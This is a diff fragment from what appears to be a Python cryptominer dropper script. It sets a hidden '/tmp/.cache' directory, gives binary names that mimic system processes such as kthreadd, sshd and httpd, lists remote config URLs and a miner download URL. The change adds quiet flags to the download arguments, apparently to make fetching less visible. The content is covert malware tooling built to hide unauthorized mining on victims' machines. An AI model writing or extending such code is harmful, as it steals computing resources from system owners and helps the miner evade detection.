@@ -8,10 +8,10 @@ import subprocess
 base_path = "/tmp/.cache"
 binary_names = ["kthreadd.", "systemd-journald.", "sshd.", "httpd."]
 config_links = [
-    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/us.ini",
-    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/usse.ini",
-    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/fr.ini",
-    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/ca.ini",
+    "-q https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/us.ini",
+    "-q https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/usse.ini",
+    "-q https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/fr.ini",
+    "-q https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/ca.ini",
 ]
 miner_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"
 
